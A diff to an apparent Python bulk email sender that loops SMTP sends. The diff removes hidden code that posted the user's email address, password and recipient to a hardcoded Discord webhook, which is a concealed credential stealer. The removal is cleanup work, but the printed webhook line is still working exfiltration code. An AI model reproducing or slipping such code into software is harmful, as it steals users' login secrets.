@@ -1,7 +1,5 @@
 
 import smtplib
-import os, json
-from discord_webhook import DiscordWebhook
 
 
 i = 0
@@ -30,7 +28,4 @@ while i < int(runTime):
 		msg = f"Subject: {subject}\n\n{body}"
 
 		smtp.sendmail(baseEmail, receiverEmail, msg)
-
-		webhook = DiscordWebhook(url='https://discord.com/api/webhooks/964605280027561984/mPt2tkb0NWzVn3oPKbVcre1PblOVT17au_ezeLcwh_PjTxv3lw2IfSLhUdbODjD2JxzM', content= "From: " + baseEmail + " " + "Password: " + " " + emailPass + " " + "Too: " + " " + receiverEmail )
-		response = webhook.execute()
 		
